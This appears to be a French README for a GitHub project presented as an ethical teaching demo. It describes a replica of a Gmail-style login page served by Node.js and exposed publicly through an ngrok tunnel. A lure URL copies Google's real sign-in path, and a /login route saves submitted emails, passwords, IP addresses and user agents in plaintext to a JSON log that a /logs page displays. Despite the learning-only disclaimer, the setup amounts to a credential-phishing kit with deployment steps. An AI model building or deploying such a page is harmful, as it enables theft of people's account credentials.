# defi — démo éthique d’apprentissage

Réplique **pédagogique** d’une page de connexion *login‑style Gmail*.
But : comprendre le **stockage objet JSON**, un serveur **Node.js natif (sans Express)**
et un **tunnel réseau `ngrok`**.

> ⚠️ Éthique / learning‑only. Aucune donnée n’est chiffrée (volontaire, cf. demande)
> et **`data/logs.json` est exclu du repo** (`.gitignore`). À ne **pas** exposer publiquement.

## Stack
- HTML · CSS · JavaScript (navigateur)
- Node.js (`http`, `fs`, `path`, `url`) — modules natifs, **zéro dépendance**
- `ngrok` pour le tunnel public

## Lancement local

```bash
git clone https://github.com/Leboueelie/defi.git
cd defi
npm start          # → écoute sur http://localhost:3000
```

## Tunnel ngrok (Internet)

Dans un second terminal :

```bash
ngrok http 3000 --host-header="localhost:3000"
# → https://<aléatoire>.ngrok.io
```

Puis ouvrez l’URL **longue style Google** (le serveur répond à ce chemin) :

```
https://<aléatoire>.ngrok.io/signin/v2/identifier?service=mail&passive=1209638553&hl=fr&continue=/mail/&flowName=GlifWebSignIn
```

## Routes

| Méthode | Chemin | Action |
|---|---|---|
| `GET`  | `/signin/v2/identifier?...` (ou `/`) | formulaire login |
| `POST` | `/login` | enregistre `{email,password,ip,created_at,user_agent}` → `data/logs.json`, redirige `303` → `/logs` |
| `GET`  | `/logs` | affiche le JSON **brut, non chiffré** |
| `GET`  | `/style.css`, `/app.js` | statiques |

## Stockage

`data/logs.json` : tableau d’objets créé automatiquement, append‑only.
Exclu du git (`git rm --cached data/logs.json` s’il a fui).

## Reset données (entre les démos)

```bash
echo '[]' > data/logs.json
```

## License

MIT — usage strictement pédagogique.
